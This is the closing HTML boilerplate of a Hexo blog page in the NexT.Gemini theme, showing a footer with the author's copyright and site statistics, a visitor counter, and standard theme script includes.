  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:38</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
